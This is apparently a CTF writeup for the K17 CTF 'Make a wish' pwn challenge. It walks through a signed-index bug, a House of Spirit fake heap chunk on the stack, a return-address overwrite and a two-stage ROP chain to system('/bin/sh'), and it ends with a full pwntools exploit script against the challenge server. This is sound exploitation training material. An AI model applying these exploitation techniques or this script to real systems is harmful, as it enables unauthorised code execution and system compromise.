---
title: "K17CTF: Make a Wish Writeup"
date: 2026-09-12
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "k17ctf"
  - "binary exploitation"
  - "writeup"
---

I feel it has been a while since I published a pwn writeup. Today I am bringing you my writeup for `Make a wish` pwn challenge from K17 CTF. Since they are based in Australia, I felt the need to support them by joining the ctf and trying some challenges <3. Honestly, I am glad I did, enjoyed the pwn challenges and learned new stuff. Let's get to this writeup's challenge: `Make a wish`

## Exploit Summary

My writeups generally end up quite long, so before I bore you with details, I decided to summarise how to exploit this challenge:

1. User can input upto 30 bytes for first and last name where both are stored in the stack. Splitting is done by finding 0x20 - space byte in the input to decide first and last names. This is used to create a fake heap chunk header where the size field matches what malloc uses for the rest of the challenge. Layout of this fake chunk will be discussed later

2. Free that chunk with -2 index, if layout is done properly this chunk will move to tcache.

3. Well if something goes to tcache, that can be reallocated with the next malloc call with the matching size. Create a new wish and malloc will return a pointer to that free chunk we just freed. What this means is we can write 0x90 bytes to stack now!

4. That size is more than enough to reach return address. So we can override the return address now. 

5. First stage: ROP chain to leak libc address + return back to main to exploit again.

6. Second stage: ROP chain to system(/bin/sh)

7. Profit?

Well, this was supposed to be a summary but I think I still couldn't restrain myself and put too much details. If you understood the solution from the summary, feel free to skip to [Final Code](#final-code) to see this in action. Otherwise get ready to bore yourself with my lengthy writeup. 

## First Look

In terms of security flags, this challenge is quite generous: `No PIE, No Canary, Partial RelRo`. Very nice, we don't have to leak PIE and Canary.

Quick look into the binary shows that it is kind of a heap menu challenge but it is pretty restrictive. We can allocate a chunk by making a new wish and write to it during that call, or delete a wish. 5 slots are allocated for wishes, so under normal conditions we can only make 5 allocations. Then we notice the major bug of the challenge: `Index entered by user to select the allocation slot is signed int`. With the modulus following this `ind = userIn % 5;`, we can technically select -4 to 4 as the index! 

When the binary runs, user provides up to 30 bytes as first and last name input. This then gets processed by `split` function by searching the first occurence of space to split the input into first and last name. And amazingly, this first and last name is stored in the stack right before the heap allocations array:


![Stack layout](/assets/img/makewish_stack.png)

Here in the layout, we can see where heap pointers are stored, shown as 0 and other variables relative to it. Last name of the user input is stored at -2. First name is also close to it at index 6 (I forgot to mark it in image ;-;). Referring back to the bug we discussed, we can't reach first name but we can reach last name in stack by using -2 in create and free options. `If you can allocate, write and free a region, you can do some heap shenanigans`. Heaps of them actually - pun intended.

Let's say I spent some considerable amount of time trying tcache and unsorted bin stuff first and never talk about it again. There was no UAF, I could leak stuff but not modify return address, instead let's focus on what actually worked. In this instance, the attack we will look at is called **`House of spirit`**. Before we come to the juicy stuff, I also found some interesting gadget function in the binary, from ghidra decompiled output:

```c++
undefined8 sub_401296(void)
{
  return 0x5fc3c031;
}
```

It took me a while to understand that this is a gadget given to us by the author. Since there is no PIE, this clearly indicates we need to overwrite return address and we are given a pop rdi pop rbp gadget here. Well what the gadget is, is not clear from that magic number, you figure it out by using ROPGadget or whatever ROP tool. Anyways, this actually led me into thinking more about how I could get malloc return a stack address, answer was House of Spirit. 

## Improvements

Before we dive into the solution, I want to take a moment to mention how we can make our lifes easier. If you look at the given binary in ghidra, you will see that there is a system call at the beginning `system("clear")`. How interesting and annoying! This caused two problems:

1. System call forks, and when debugging this is annoying. You need to use additional commands set follow fork or whatever, and switch inferiors etc. It is annoying to me that I don't exactly know all these commands and have to look it up each time, put it into gdbscript....... 

2. Clear actually clears the buffer in the gdb terminal, so I couldn't see what errors printed if my follow forks were working or not.

But I realized I don't have to deal with this. I decided to patch the binary, I am not good at patching in ghidra, so I opened the binary in a hex editor and patched 5 bytes used by that system call instruction into all NOPs:

```
        00401686 48 89 c7        MOV        RDI,RAX
        00401689 90              NOP
        0040168a 90              NOP
        0040168b 90              NOP
        0040168c 90              NOP
        0040168d 90              NOP
        0040168e 48 8d 05        LEA        RAX,[s_my_vape_just_died,_so_here's_a_w_004021   = "my vape just died, so here's 
                 93 0a 00 00

```

No more annoying debugging issues. Debugging is very critical part of pwn challenges, if I can't debug properly I can't solve pwn challenges. I am not an all-seeing omnipotent being, I can't figure out stack layout and positions just by looking at decompiled code :)

Now that was out of the way, there was one more thing I needed to patch. In a previous easy pwn challenge from the same CTF, I wasted about an hour on figuring out why my libc offsets were wrong and didn't match the given libc, before I realized binary was using my host's libc, smh. So I learned my lesson there, I wanted to make sure binary was using the right libc. But we weren't given the libc :( At least I had the dockerfile so I could extract libc and patch the binary with that:

```
# Build the docker image and create a container for it to extract the correct libc version
docker build -t pwn-chall .
docker create --name temp-chall pwn-chall

# Copy ld and libc, -L follows symlinks to copy exact file
docker cp -L temp-chall:/srv/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp -L temp-chall:/srv/lib64/ld-linux-x86-64.so.2 ./ld.so.2
docker rm temp-chall

# Use the directory of binary to look for libc, and patch the interpreter
patchelf --set-interpreter ./ld.so.2 --set-rpath '$ORIGIN' ./chal
```

And now with this in place, I had access to exact libc version REMOTE was using and I was sure that the binary won't use my local libc. Thanks to that one hour spent on previous easy challenge, I knew what to do in this case.

## Solution

Finally we can talk about the solution. So far we know that we can reach last name in stack with -2 index, we can call make a wish or free a wish with that index. First name and last name is provided by user and this gives us an attack opportunity. Let's look at a case how we can make use of that. 

### Fake Chunk - House of Spirit

Since we provide the first and last name, we can create a fake heap chunk but we need to align properly. Let's go over the stack layout again:

![Stack](/assets/img/makewish_stack2.png)

I have marked where pointers are stored, 0 index. Then we can see where first name is stored after allocations array, as well as a pointer to last name in -2 index. This is the crucial part, when we select -2 for deleting a wish what happens is we end up calling free on that pointer. **So it actually tries to free Last Name in stack as if it is a heap chunk**

In that example I properly put required heap chunk stuff there. When free is called, it will check chunk's header to make sure you are freeing a valid size, in this case I used 0xA1. This size matches the malloc(0x90) used in the create option (Additional 16 bytes are for chunk header) and +1 is for setting `prev_inuse = true`. Tbh, you can also use 0xA0 as a size, for some reason I though A0 could stop reading but it won't.

So this gives us roughly this layout for name input:

```
    buf[0:8]   = firstname filler - avoid 0x20
    buf[8]     = 0xa1   -> fake chunk size with PREV_INUSE set
    buf[9:15]  = 0x00 * 6
    buf[15]    = 0x20   -> the space split() searches for; it gets nulled in place, which becomes part of fake chunk size
    buf[16:30] = up to 14 bytes of don't-care "lastname" content
```

Reasoning is when free is called it will look at previous 16 bytes from first name as chunk header. Those 16 bytes consists of prev size(8) + size(8). So we need to make sure second 8 bytes of that input matches the next malloc's size. First 8 bytes can be anything, free didn't complain that I had DEADBEEF there. And then we fill the rest of input buffer for last name, making sure there is a space after first name. Looking at this, I probably didn't need to put 8th byte of size as 0x20 but it didn't matter, after `split()` that byte gets nulled. 

Now let's look at what happens when we allocate a new chunk:

![Allocation](/assets/img/makewish_alloc.png)

Success! We can see that malloc returned a pointer to where last name was stored in the input buffer. It is at `rbp-32` and we can see the return address at `rbp+8`. So by providing 40 bytes of input we can reach and overwrite return address now!

Just one more thing to note before we close this, there is a pointer at `rbp-8` and that pointer is actually dereferenced later on. So whenever we provide a overwrite buffer, we need to make sure whatever we put there can actually be dereferenced. 

### Stage 1

House of spirit worked, we could get a pointer in stack returned by malloc. Now all we need to do is provide our 40 bytes of padding + ROP chain. Currently there is no PIE but we don't know libc address, heap address or stack address. I decided to solve this in two stages where in one stage I leak libc and return back to main and in next stage I ROP to shell. Honestly, maybe it could be done in one stage but I couldn't see how I could provide /bin/sh to system stored in plt. So you are stuck with my two stage solution. 

For 40 bytes padding, I used this:

```python
    payload = b'A' * 24
    payload += p64(elf.bss(0))      # This pointer is dereferenced! Use a valid pointer address
    payload += b'CAFEBABE'          # rbp
```

Reminder again, rbp-8 is dereferenced. So I just provided binary's bss section, since there is no PIE, that address should be dereferencable.  After this we build the leak payload by calling `puts(GOT['puts'])` and then returning back to start:

```python
    # Binary has this deliberate gadget for us:
    pop_rdi_pop_rbp = p64(0x4012e2)   

    payload += pop_rdi_pop_rbp + p64(elf.got.puts) + b'A' * 8
    payload += p64(elf.plt.puts)        # call puts(GOT[puts])
    payload += p64(elf.sym._start) 
```

Author's pop rdi gadget came in very handy here to store puts got in RDI so we can call `puts(GOT[puts])`. **You can notice instead of going back to main, I returned back to _start. Otherwise second run was crashing for some reason**. This will leak puts from GOT that we can read and figure out the libc base address and then return back to the beginning so we can exploit again.

### Stage 2

Next stage is exact copy of first stage with the only change being ROP chain. We still need to do House of Spirit attack to get malloc return stack address. And then fill the 40 padding bytes in exact same way to reach return address. And finally now we can do ROP chain to shell!

System exists in binary's PLT, in your ROP chain you can either use that or find another system gadget from libc. I already had same exact ret2libc code from older pwn challenges so I just used that instead:

```python
# Assuming house of spirit is already done again
def stage2(p):
    # Stage 2: return to system(bin/sh)
    payload = b'A' * 24
    payload += p64(elf.bss(0))      # This pointer is dereferenced! Use a valid pointer address
    payload += b'CAFEBABE'          # rbp

    # Now the ROP
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]

    payload += p64(pop_rdi) + p64(binsh)
    # payload += p64(ret_gadget) + p64(elf.plt.system)      # Ret gadget to align stack!
    payload += p64(ret_gadget) + p64(system)              # Same thing even if we use libc's system directly    

    print(payload.hex())

    # Overwrite the return with ROP
    create(p, 0, payload)
```

It is a pretty obvious step and almost same copy of stage 1, so I will shut up for now to prevent this writeup becoming a book.

### Possible Issues

I think this section requires its own part. Throughout the challenge I faced some issues that could prevent shell or cause crashes, so I decided to combine them here:

1. Nowadays libc might panic if system call is not stack aligned to a nice number. So I added an additional return gadget just before system call. I faced this problem in quite a few challenges, it kind of became a habit for me: `add a return before system calls`

2. For some reason if I tried to return to binary's main, stage 2 was crashing in print calls. So instead I returned to binary's `_start` which worked much better.

3. Already mentioned this twice, `rbp-8` is dereferenced, so just be careful with your padding 40 bytes.

## Final Code

```python
from pwn import *

exe  = './chal'
elf  = ELF(exe)
libc = ELF('./libc.so.6')

context.binary = elf
context.log_level = 'debug'
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']

def create(p, idx, note):
    p.sendline(b"1")
    p.sendlineafter(b">> ", str(idx).encode())
    p.sendlineafter(b">> ", note)

def delete(p, idx):
    p.sendline(b"2")
    p.sendlineafter(b">> ", str(idx).encode())
    
def forged_chunk():
    # buf[0:8]   = firstname filler - avoid 0x20
    # buf[8]     = 0xa1   -> fake chunk size with PREV_INUSE set
    # buf[9:15]  = 0x00 * 6
    # buf[15]    = 0x20   -> the space split() searches for; it gets
    #                        nulled in place, which becomes part of fake chunk size
    # buf[16:30] = up to 14 bytes of don't-care "lastname" content
    return b"DEADBEEF" + b'\xa1' + b'\x00'*6 + b' ' + b'SECRETLASTNAME'

def house_of_spirit(p):
    p.send(forged_chunk())
    p.recvuntil(b">> ")

    # free the forged fake chunk so next allocation lands on name in stack
    delete(p, -2)

def stage1(p):
    # Binary has this deliberate gadget for us:
    pop_rdi_pop_rbp = p64(0x4012e2)   

    # Stage 1: leak puts got and then return back to main
    payload = b'A' * 24
    payload += p64(elf.bss(0))      # This pointer is dereferenced! Use a valid pointer address
    payload += b'CAFEBABE'          # rbp

    # Now the ROP
    payload += pop_rdi_pop_rbp + p64(elf.got.puts) + b'A' * 8
    payload += p64(elf.plt.puts)        # call puts(GOT[puts])

    # IMPORTANT: Going back to main here caused crashes in printf calls
    # Returning back to _start is much cleaner for some reason?
    payload += p64(elf.sym._start)      

    # Overwrite the return with ROP
    create(p, 0, payload)

    # Capture the leaked puts address while exiting and returning to main
    p.sendlineafter(b'>> ', b'3')
    p.recvuntil(b'\x1b[0m\n')
    p.recvuntil(b'\x1b[0m\n')

    leak = p.recvuntil(b'\n',drop=True)
    leaked_puts = u64(leak.ljust(8, b'\x00'))
    libc.address = leaked_puts - libc.sym.puts
    print(f'{hex(leaked_puts)}')
    print(f'{hex(libc.address)}')


def stage2(p):
    # Stage 2: return to system(bin/sh)
    payload = b'A' * 24
    payload += p64(elf.bss(0))      # This pointer is dereferenced! Use a valid pointer address
    payload += b'CAFEBABE'          # rbp

    # Now the ROP
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]

    payload += p64(pop_rdi) + p64(binsh)
    # payload += p64(ret_gadget) + p64(elf.plt.system)      # Ret gadget to align stack!
    payload += p64(ret_gadget) + p64(system)              # Same thing even if we use libc's system directly    

    print(payload.hex())

    # Overwrite the return with ROP
    create(p, 0, payload)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('chal.secso.cc', 4004)
    else:
        return process([exe] + argv, *a, **kw) 

gdbscript = '''
b *main+265
c
'''.format(**locals())

p = start()

# Free a fake chunk to get malloc return a stack address
p.recvuntil(b">> ")
house_of_spirit(p)
stage1(p)

# Same technique, this time return to system
p.recvuntil(b">> ")
house_of_spirit(p)
stage2(p)

# Exit and get shell!
p.sendlineafter(b'>> ', b'3')
p.interactive()
```

## Last Words

Hopefully I didn't bore you with a long-ass writeup. I enjoy solving pwn challenges, I also enjoy documenting them in a way to make it easier to understand for myself and others like me. I know that one day I will come back to this writeup to understand some stuff I forgot about pwn challenges. I hope I will be satisfied with what I recorded here.

Anyways, enough chit chat. This was quite a fun and informative challenge for me. Patching binary to make my life easier, and house of spirit was my biggest takeaways from this challenge. I will definitely look for ways to patch challenges in future challenges I try. 

As always, keep learning!